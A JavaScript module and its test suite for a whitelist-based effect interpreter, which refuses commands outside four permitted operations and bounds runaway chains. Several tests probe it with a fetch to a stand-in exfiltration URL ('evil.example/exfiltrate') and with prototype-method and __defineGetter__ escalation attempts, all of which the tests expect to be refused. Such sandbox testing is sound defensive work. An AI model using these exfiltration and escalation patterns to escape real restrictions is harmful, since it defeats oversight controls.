/**
 * `interpret` — the restricted effect interpreter (EXEC-01). It translates a
 * guest `Effect` into its value by dispatching through `map`, refusing (as a
 * `Result`, never a throw — locked decision, see 03-CONTEXT.md) anything
 * `map` does not itself own. EXEC-02 (the own-property dispatch guard) is
 * delivered upstream in fjs 0.41.0's `match`/`at` and is not reimplemented
 * here — this module only catches `match`'s bare-string refusal throw and
 * reports it with the permitted set. The module imports only
 * `functionalscript/fjs/effects/module.f.js`,
 * `functionalscript/fjs/types/result/module.f.js`, and
 * `functionalscript/fjs/asserts/module.f.js` (no CAS, no Evo, no MCP, no
 * filesystem).
 *
 * @module
 */
import { match, do_, step } from 'functionalscript/fjs/effects/module.f.js'
import { ok, error } from 'functionalscript/fjs/types/result/module.f.js'
import { assert, assertEq } from 'functionalscript/fjs/asserts/module.f.js'

/** @import { Effect, Operation, OperationMap, Return } from 'functionalscript/fjs/effects/module.f.js' */
/** @import { Result } from 'functionalscript/fjs/types/result/module.f.js' */

// ── Test fixtures ───────────────────────────────────────────────────────────────

/** @typedef {readonly ['casRead', (a: string) => string]} CasRead */
/** @typedef {readonly ['evoList', (a: string) => string]} EvoList */
/** @typedef {readonly ['evoHead', (a: string) => string]} EvoHead */
/** @typedef {readonly ['evoRevision', (a: string) => string]} EvoRevision */
/** @typedef {CasRead | EvoList | EvoHead | EvoRevision} TestOp */

/**
 * The proof's whitelist: exactly `casRead`, `evoList`, `evoHead`,
 * `evoRevision`, in this declaration order — `Object.keys` reports insertion
 * order, and that order is what a refusal message's permitted list reads as.
 * The null prototype below is cheap defence in depth (03-CONTEXT.md); it is
 * not the security mechanism — `match`'s own-property-only `at` lookup is
 * (EXEC-02, delivered upstream, not reimplemented here).
 * @type {OperationMap<TestOp, string>}
 */
const map = {
    casRead: a => `casRead:${a}`,
    evoList: a => `evoList:${a}`,
    evoHead: a => `evoHead:${a}`,
    evoRevision: a => `evoRevision:${a}`,
}
Object.setPrototypeOf(map, null)

/**
 * Simulates a stored/generated program whose command string bypassed `tsc` —
 * a real `CasOp`-typed program cannot construct these (see EXEC-07, Phase
 * 6) — but `interpret`'s runtime refusal is the backstop for exactly this
 * case. Every non-permitted-name probe below goes through `unsafeDo`; the
 * one permitted-name probe uses plain `do_`.
 * @type {(command: string) => (...payload: readonly unknown[]) => Effect<TestOp, string>}
 */
const unsafeDo = /** @type {any} */ (do_)

/**
 * `do_` narrowed to the one permitted-name probe (`dispatch`, below).
 * `do_('casRead')` alone under-constrains `O` to bare `Operation`, not
 * `CasRead` — this annotation is what pins it.
 * @type {(a: string) => Effect<CasRead, string>}
 */
const readDo = do_('casRead')

/**
 * `do_` narrowed to `evoHead`, for the two-step read-set proof below — same
 * under-constraining reason as `readDo`.
 * @type {(a: string) => Effect<EvoHead, string>}
 */
const evoHeadDo = do_('evoHead')

// ── interpret ────────────────────────────────────────────────────────────────

/**
 * Reports a refusal: the refused command's name plus `map`'s own permitted
 * set, in `Object.keys` insertion order (never sorted or filtered) — this is
 * the reported text an agent reads, not `match`'s raw bare-string throw.
 * @type {(command: string, map: object) => string}
 */
const refusalMessage = (command, map) => `operation not permitted: ${command}; permitted: ${Object.keys(map).join(', ')}`

/**
 * One command `interpret` actually dispatched: its name and the payload it
 * was called with. Observed by `interpret` as it dispatches, never declared
 * or supplied by the guest effect (EXEC-05) — see `reads` below.
 * @typedef {readonly [string, readonly unknown[]]} Read
 */

/**
 * An interpreted effect's outcome: the effect's value paired with every
 * command actually dispatched to reach it, in dispatch order — or a
 * refusal (EXEC-03's actionable text, or the step-budget refusal, EXEC-06).
 * @template T
 * @typedef {Result<readonly [T, readonly Read[]], string>} Interpreted
 */

/**
 * Bounds `interpret`'s dispatch loop (EXEC-06). `asyncRun` elsewhere in fjs
 * is an unbounded `while (true)` — a generated effect chain with a wrong
 * termination condition would otherwise hang the single-process server
 * silently, with no response and no way to cancel. 10,000 is a runaway
 * guard, not a tuned limit — a named, exported constant so it can be
 * changed without hunting a literal (03-CONTEXT.md).
 * @type {number}
 */
export const stepBudget = 10_000

/**
 * Dispatches a guest `Effect` through `map`, one command at a time, bounded
 * by `stepBudget` and accumulating the read set it actually observes.
 *
 * A `Pure` effect is already-computed per its contract — `e()` forces it
 * directly, no dispatch involved, and the loop returns with everything
 * dispatched so far alongside the value. A `Do` node goes through
 * `match(map)(e)`: on `'cont'`, the dispatched command and its payload are
 * appended to `reads` **after** the dispatch succeeds, never before — a
 * refused attempt was never read, per EXEC-05 — and the loop continues with
 * the continuation applied to the operation's output.
 *
 * `match` refuses any command that is not an own property of `map` by
 * throwing the **bare command string** — not an `Error`, no `.message`
 * (verified against the installed fjs 0.41.0; see 03-CONTEXT.md). The
 * `catch` below reads the caught value directly, asserts it is that string
 * per `match`'s documented contract, and reports it as a `Result`, never a
 * throw — a refusal is a routine, correctable outcome here, not a crash.
 *
 * If the loop exhausts `stepBudget` without reaching a `Pure` node, the
 * chain is treated as non-terminating and refused the same way a denied
 * command is — a value, never a thrown error or an unbounded hang
 * (EXEC-06).
 * @template {Operation} O
 * @template T
 * @param {OperationMap<O, Return<O>>} map
 * @returns {(effect: Effect<O, T>) => Interpreted<T>}
 */
export const interpret = map => effect => {
    /** @type {Effect<O, T>} */
    let e = effect
    /** @type {readonly Read[]} */
    let reads = []
    for (let count = 0; count < stepBudget; count++) {
        if (typeof e === 'function') {
            return ok(/** @type {readonly [T, readonly Read[]]} */ ([e(), reads]))
        }
        const { command, payload } = e
        try {
            const result = match(map)(e)
            assert(result[0] === 'cont')
            reads = [...reads, [command, payload]]
            e = result[2](result[1])
        } catch (thrown) {
            assert(typeof thrown === 'string')
            return error(refusalMessage(thrown, map))
        }
    }
    return error(`step budget exceeded: ${stepBudget}`)
}

// ── Tests ────────────────────────────────────────────────────────────────────

export const proof = {
    dispatch: () => {
        const result = interpret(map)(readDo('doc-a'))
        assertEq(result[0], 'ok')
        const [value, reads] = result[1]
        assertEq(value, 'casRead:doc-a')
        assertEq(JSON.stringify(reads), JSON.stringify([['casRead', ['doc-a']]]))
    },
    // EXEC-06: a self-referential chain that never reaches a `Pure` node
    // must not hang `interpret` — it returns a bounded step-budget refusal
    // within `stepBudget` iterations. `step`'s `Do` case defers, so
    // constructing `forever()` terminates immediately; only interpreting it
    // drives the (otherwise infinite) chain, and the budget bounds that.
    stepBudgetBoundsNonTerminatingChain: () => {
        /** @type {() => Effect<CasRead, never>} */
        const forever = () => step(readDo('spin'), forever)
        const result = interpret(map)(forever())
        assertEq(result[0], 'error')
        assertEq(result[1], 'step budget exceeded: 10000')
    },
    // EXEC-05: the read set is observed as interpret dispatches, never
    // declared by the effect chain itself.
    readSetReflectsActualDispatch: () => {
        const chain = step(readDo('doc-a'), () => evoHeadDo('subject-b'))
        const result = interpret(map)(chain)
        assertEq(result[0], 'ok')
        const [, reads] = result[1]
        assertEq(
            JSON.stringify(reads),
            JSON.stringify([['casRead', ['doc-a']], ['evoHead', ['subject-b']]]))
    },
    // A refusal partway through a chain must still refuse, and must report the
    // refused command — not the successful one before it. Every other refusal
    // proof denies on the *first* command, so without this leaf nothing covers
    // a denial reached after real work.
    //
    // Note what this deliberately does NOT claim. Whether `reads` is extended
    // before or after `match` dispatches is unobservable from outside: the
    // refusal path returns `error(message)` and discards the read set. Both
    // orderings pass every proof here. The append sits after the dispatch
    // because a refused operation was never read, but that is an invariant of
    // the implementation, not something the current API can witness. If a later
    // phase returns partial reads alongside a refusal, this becomes testable and
    // should be pinned then.
    refusalPartwayThroughAChainReportsTheRefusedCommand: () => {
        const denied = step(readDo('doc-a'), () => unsafeDo('fetch')('https://evil'))
        const result = interpret(map)(denied)
        assertEq(result[0], 'error')
        assertEq(
            result[1],
            'operation not permitted: fetch; permitted: casRead, evoList, evoHead, evoRevision')
    },
    refusals: {
        constructor: () => {
            const result = interpret(map)(unsafeDo('constructor')())
            assertEq(result[0], 'error')
            assertEq(
                result[1],
                'operation not permitted: constructor; permitted: casRead, evoList, evoHead, evoRevision')
        },
        toString: () => {
            const result = interpret(map)(unsafeDo('toString')())
            assertEq(result[0], 'error')
            assertEq(
                result[1],
                'operation not permitted: toString; permitted: casRead, evoList, evoHead, evoRevision')
        },
        valueOf: () => {
            const result = interpret(map)(unsafeDo('valueOf')())
            assertEq(result[0], 'error')
            assertEq(
                result[1],
                'operation not permitted: valueOf; permitted: casRead, evoList, evoHead, evoRevision')
        },
        hasOwnProperty: () => {
            const result = interpret(map)(unsafeDo('hasOwnProperty')())
            assertEq(result[0], 'error')
            assertEq(
                result[1],
                'operation not permitted: hasOwnProperty; permitted: casRead, evoList, evoHead, evoRevision')
        },
        defineGetter: () => {
            const result = interpret(map)(unsafeDo('__defineGetter__')())
            assertEq(result[0], 'error')
            assertEq(
                result[1],
                'operation not permitted: __defineGetter__; permitted: casRead, evoList, evoHead, evoRevision')
        },
        fetch: () => {
            const result = interpret(map)(unsafeDo('fetch')('https://evil.example/exfiltrate'))
            assertEq(result[0], 'error')
            assertEq(
                result[1],
                'operation not permitted: fetch; permitted: casRead, evoList, evoHead, evoRevision')
        },
    },
    // EXEC-04: the two-step escalation chased to its logical end, not just a
    // single refused dispatch. Installing a getter for a denied command is
    // itself refused before the getter function ever runs, so the map gains
    // no own property from the attempt, and a following dispatch of the
    // target command is still refused with its own message.
    twoStepDefineGetterEscalation: () => {
        const install = interpret(map)(unsafeDo('__defineGetter__')('fetch', () => 'exfiltrated'))
        assertEq(install[0], 'error')
        assertEq(
            install[1],
            'operation not permitted: __defineGetter__; permitted: casRead, evoList, evoHead, evoRevision')
        assert(!Object.hasOwn(map, 'fetch'))
        const followUp = interpret(map)(unsafeDo('fetch')('https://evil.example/exfiltrate'))
        assertEq(followUp[0], 'error')
        assertEq(
            followUp[1],
            'operation not permitted: fetch; permitted: casRead, evoList, evoHead, evoRevision')
    },
}
